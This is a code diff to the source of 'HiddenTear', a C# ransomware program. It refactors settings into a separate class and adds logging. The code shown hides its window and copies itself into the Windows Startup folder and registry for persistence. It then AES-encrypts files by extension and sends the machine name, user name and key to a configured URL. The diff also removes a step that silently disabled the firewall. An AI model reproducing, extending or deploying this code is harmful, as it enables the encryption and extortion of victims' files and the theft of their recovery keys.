@@ -9,23 +9,27 @@ using System.Text;
 using System.Windows.Forms;
 using Microsoft.Win32;
 
+
+
+
 namespace HiddenTear
 {
     public partial class Form1 : Form
     {
         public Form1()
         {
+            Common.Log("File opened!");
             InitializeComponent();
         }
         private void Form1_Load(object sender, EventArgs e)
         {
-            string password = createPassword(PASSLENGTH);
-            string thisPath = Assembly.GetEntryAssembly().Location;
-            byte[] thisExe = File.ReadAllBytes(thisPath);
-            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
-            addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
+            string password = createPassword(Settables.PASSLENGTH);
+            Common.Log("password is : " + password);
+                //string thisPath = Assembly.GetEntryAssembly().Location;
+                //byte[] thisExe = File.ReadAllBytes(thisPath);
+                //dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
+                //addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
 
-            log("opened");
             Opacity = 0;
             this.ShowInTaskbar = false;
             startAction();
@@ -41,15 +45,17 @@ namespace HiddenTear
 
         void startAction()
         {
-            string password = createPassword(PASSLENGTH);
+            Common.Log("Sequence started!");
+            string password = createPassword(Settables.PASSLENGTH);
             string thisPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
             byte[] thisExe = File.ReadAllBytes(thisPath);
             dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
             addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
 
-            if (!string.IsNullOrEmpty(CONTAINMENTPATH))
+            Common.Log("Persisted, starting encryption!");
+            if (!string.IsNullOrEmpty(Settables.CONTAINMENTPATH))
             {
-                encryptDirectory(CONTAINMENTPATH);
+                encryptDirectory(Settables.CONTAINMENTPATH);
             }
             else
             {
@@ -79,8 +85,9 @@ namespace HiddenTear
                 }
             }
 
+
             dropFiles();
-			if (URL != "") sendPassword(password);
+            if (Settables.URL != "") sendPassword(password);
             password = null;
             System.Windows.Forms.Application.Exit();
         }
@@ -107,7 +114,7 @@ namespace HiddenTear
                 for (int i = 0; i < files.Length; i++)
                 {
                     string extension = Path.GetExtension(files[i]);
-                    if (EXTENTIONS.Contains(extension.ToLower()))
+                    if (Settables.EXTENTIONS.Contains(extension.ToLower()))
                     {
                         encryptFile(files[i]);
                     }
@@ -125,7 +132,7 @@ namespace HiddenTear
             {
                 try
                 {
-                    if (Mode == ExecutionMode.Full)
+                    if (Settables.Mode == ExecutionMode.Full)
                     {
                         byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                         File.WriteAllBytes(file, bytesEncrypted);
@@ -164,7 +171,7 @@ namespace HiddenTear
                         File.SetAttributes(file, attributes);
                     }
 
-                    if (Mode == ExecutionMode.Full)
+                    if (Settables.Mode == ExecutionMode.Full)
                     {
                         byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                         File.WriteAllBytes(file, bytesEncrypted);
@@ -206,7 +213,7 @@ namespace HiddenTear
                     AES.KeySize = 256;
                     AES.BlockSize = 128;
 
-                    var key = new Rfc2898DeriveBytes(passwordBytes, SALT, 1000);
+                    var key = new Rfc2898DeriveBytes(passwordBytes, Settables.SALT, 1000);
                     AES.Key = key.GetBytes(AES.KeySize / 8);
                     AES.IV = key.GetBytes(AES.BlockSize / 8);
 
@@ -226,54 +233,11 @@ namespace HiddenTear
 
         void sendPassword(string password)
         {
-            if (string.IsNullOrEmpty(URL)) return;
+            if (string.IsNullOrEmpty(Settables.URL)) return;
             string info = Environment.MachineName + "-" +
                             Environment.UserName + " " +
                             password;
-            var fullUrl = URL + info;
-
-            using (System.Net.WebClient client = new System.Net.WebClient())
-            {
-                string testie = "";
-                try
-                {
-                    testie = client.DownloadString("google.com");
-                }
-                catch { }
-
-                if (!string.IsNullOrEmpty(testie))
-                {
-                    try
-                    {
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-                else
-                {
-                    try
-                    {
-                        System.Diagnostics.Process process = new System.Diagnostics.Process();
-                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                        startInfo.FileName = "cmd.exe";
-                        startInfo.Arguments = "netsh firewall set opmode disable";
-                        process.StartInfo = startInfo;
-                        process.Start();
-
-                        process.WaitForExit();
-
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-            }
-        }
-        void log(string message)
-        {
-            if (string.IsNullOrEmpty(LOGURL)) return;
-            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
-            var fullUrl = LOGURL + info;
+            var fullUrl = Settables.URL + info;
 
             using (System.Net.WebClient client = new System.Net.WebClient())
             {
